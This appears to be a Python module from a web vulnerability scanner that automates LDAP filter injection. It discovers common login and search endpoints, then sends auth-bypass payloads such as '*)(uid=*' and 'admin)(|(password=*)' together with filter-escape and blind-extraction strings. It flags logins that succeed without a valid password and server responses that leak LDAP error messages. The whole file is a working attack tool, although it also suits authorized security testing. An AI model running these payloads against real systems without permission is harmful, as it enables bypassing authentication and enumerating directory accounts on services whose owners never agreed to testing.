"""ldap_injection v2 — LDAP filter injection with baseline + auth bypass.

Техники:
  1. Auth bypass: *)(uid=*)(&  → логин без пароля
  2. Filter escape: *)(cn=* — провоцирует ошибки
  3. Error-based: комбинированные фильтры → server error
  4. Blind extraction: *)(uid=a* — посимвольный
  5. Query string injection в login/search endpoints

Error markers:
  - Java: javax.naming.*, com.sun.jndi.ldap, LDAPException
  - PHP: ldap_search() ..., Invalid DN syntax
  - Python: ldap3, LDAPError, ldap.LDAPError
  - Generic: "Bad search filter", "invalid DN", "no such object"
"""
import secrets
from core.http import HttpClient
from core.verify import verify, confidence, is_signal


# error markers — расширенный набор
LDAP_ERROR_MARKERS = [
    # Java
    "javax.naming.NameNotFoundException",
    "javax.naming.directory.InvalidSearchFilterException",
    "javax.naming.AuthenticationException",
    "com.sun.jndi.ldap",
    "LDAPException:",
    "LDAPv3",
    # PHP
    "ldap_search()",
    "ldap_bind()",
    "Invalid DN syntax",
    "Bad search filter",
    "Warning: ldap_",
    # Python
    "LDAPError",
    "ldap3.core.exceptions",
    "ldap.LDAPError",
    # Generic
    "no such object (32)",
    "invalidCredentials (49)",
    "result: 32",
    "resultCode=49",
    "operationsError",
]

# LDAP injection payloads — формы
LDAP_PAYLOADS = [
    # --- auth bypass ---
    ("wildcard",           "*"),
    ("wildcard_uid",       "*)(uid=*"),
    ("wildcard_cn",        "*)(cn=*"),
    ("admin_and",          "admin)(&"),
    ("admin_or_all",       "admin)(|(password=*)"),
    ("admin_comment",      "admin))(|(uid=*"),
    ("admin_close",        "admin)("),
    ("null_bind",          "admin)(|(objectClass=*)"),
    # --- filter escape ---
    ("close_only",         ")"),
    ("close_and",          ")("),
    ("escape_paren",       "\\)"),
    ("backslash",          "\\"),
    ("double_backslash",   "\\\\"),
    # --- blind extraction ---
    ("blind_a",            "*)(uid=a*"),
    ("blind_admin",        "*)(uid=admin*"),
    ("blind_pass",         "*)(userPassword=*"),
    ("blind_object",       "*)(objectClass=*"),
    # --- special chars ---
    ("null_byte",          "admin\x00"),
    ("unicode",            "аdmin"),
]

# login endpoints для auth bypass
LOGIN_PATHS = [
    "/login", "/api/login", "/auth", "/auth/login", "/signin",
    "/api/signin", "/user/login", "/session", "/ldap/login",
    "/api/authenticate", "/authenticate",
]

# search endpoints для filter escape
SEARCH_PATHS = [
    "/search", "/api/search", "/users", "/api/users",
    "/directory", "/ldap/search", "/api/v1/users",
    "/api/query",
]

USER_FIELDS = ["username", "user", "uid", "login", "cn", "email"]
PASS_FIELDS = ["password", "pass", "passwd", "pwd"]


class LdapInjection:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)

        print(f"[ldap v2] target: {base}")

        # === baseline: что в главной странице ===
        try:
            base_r = http.get(base)
            baseline_text = (base_r.text or "") if base_r else ""
        except Exception:
            baseline_text = ""

        # активные маркеры — не в baseline
        active_markers = [m for m in LDAP_ERROR_MARKERS
                          if m.lower() not in baseline_text.lower()]
        print(f"[ldap v2] {len(active_markers)}/{len(LDAP_ERROR_MARKERS)} markers active")

        if not active_markers:
            print("[ldap v2] all markers in baseline — skip")
            return {"findings": []}

        findings = []

        # === Phase 1: discovery ===
        print()
        print(f"[ldap v2] Phase 1: discovery")
        live_login = []
        for path in LOGIN_PATHS:
            url = base + path
            try:
                r = http.get(url, allow_redirects=False)
            except Exception:
                continue
            if r and r.status_code not in (404, 410):
                live_login.append(path)
                print(f"  login: {path} ({r.status_code})")

        live_search = []
        for path in SEARCH_PATHS:
            url = base + path
            try:
                r = http.get(url, allow_redirects=False)
            except Exception:
                continue
            if r and r.status_code not in (404, 410):
                live_search.append(path)
                print(f"  search: {path} ({r.status_code})")

        # === Phase 2: auth bypass через login ===
        if live_login:
            print()
            print(f"[ldap v2] Phase 2: LDAP auth bypass")
            for path in live_login:
                url = base + path
                # baseline — обычная попытка
                try:
                    r_base = http.post(url, data={
                        "username": "omni_test_user",
                        "password": "omni_test_pass",
                    }, allow_redirects=False)
                except Exception:
                    continue
                if not r_base:
                    continue
                base_status = r_base.status_code
                base_size = len(r_base.content)
                base_cookie = "set-cookie" in {k.lower() for k in r_base.headers}
                print(f"  baseline {path}: {base_status} ({base_size}b) cookie={base_cookie}")

                for uf in USER_FIELDS[:4]:
                    for pf in PASS_FIELDS[:2]:
                        for pname, payload in LDAP_PAYLOADS[:8]:  # auth bypass forms
                            data = {uf: "admin", pf: payload}
                            try:
                                r = http.post(url, data=data, allow_redirects=False)
                            except Exception:
                                continue
                            if not r:
                                continue

                            has_cookie = "set-cookie" in {k.lower() for k in r.headers}
                            status_ok = r.status_code in (200, 301, 302, 303)

                            hit = False
                            if base_status in (401, 403, 422) and status_ok:
                                hit = True
                            if status_ok and has_cookie and not base_cookie:
                                hit = True
                            if status_ok and len(r.content) > base_size + 500:
                                hit = True

                            if not hit:
                                continue

                            # verify ×2
                            try:
                                r2 = http.post(url, data=data, allow_redirects=False)
                            except Exception:
                                r2 = None
                            if not r2 or r2.status_code not in (200, 301, 302, 303):
                                continue

                            conf = confidence(0.85, 1.0)
                            if not is_signal(conf, floor=0.55, module="ldap"):
                                continue

                            findings.append({
                                "type": "ldap_auth_bypass",
                                "severity": "critical",
                                "path": path,
                                "field_user": uf,
                                "field_pass": pf,
                                "payload_name": pname,
                                "payload": payload,
                                "baseline_status": base_status,
                                "result_status": r2.status_code,
                                "verified": True,
                                "confidence": conf,
                            })
                            print(f"  ✓ LDAP auth bypass: {path} {uf}+{pf}={pname} ({base_status}->{r2.status_code})")
                            logger.finding("ldap", "critical",
                                           f"{path} auth bypass {pname}")
                            break
                        else:
                            continue
                        break
                    else:
                        continue
                    break

        # === Phase 3: error-based через login + search ===
        print()
        print(f"[ldap v2] Phase 3: error-based detection")

        for path in live_login + live_search:
            url = base + path
            # пробуем payload в query строке (search) + form body (login)
            for pname, payload in LDAP_PAYLOADS:
                # query string
                test_url = url + ("&" if "?" in url else "?") + "user=" + payload
                try:
                    r = http.get(test_url, allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue

                body_low = (r.text or "").lower()
                hit_marker = None
                for m in active_markers:
                    if m.lower() in body_low:
                        hit_marker = m
                        break

                if not hit_marker:
                    # пробуем POST с payload
                    try:
                        r_post = http.post(url, data={"user": payload, "password": payload},
                                           allow_redirects=False)
                    except Exception:
                        continue
                    if not r_post:
                        continue
                    body_low = (r_post.text or "").lower()
                    for m in active_markers:
                        if m.lower() in body_low:
                            hit_marker = m
                            r = r_post
                            break

                if not hit_marker:
                    continue

                # verify ×2
                try:
                    r2 = http.get(test_url, allow_redirects=False)
                except Exception:
                    r2 = None
                if not r2 or hit_marker.lower() not in (r2.text or "").lower():
                    continue

                conf = confidence(0.85, 1.0)
                if not is_signal(conf, floor=0.55, module="ldap"):
                    continue

                findings.append({
                    "type": "ldap_error_based",
                    "severity": "high",
                    "path": path,
                    "payload_name": pname,
                    "payload": payload,
                    "marker": hit_marker,
                    "confidence": conf,
                })
                print(f"  ✓ LDAP error: {path} {pname} ({hit_marker[:40]})")
                logger.finding("ldap", "high",
                               f"{path} {pname} marker={hit_marker[:40]}")
                break

        # === Phase 4: blind extraction (посимвольный) ===
        # stub — требует рабочего auth + login endpoint

        print()
        print(f"[ldap v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "live_login": live_login,
            "live_search": live_search,
        }
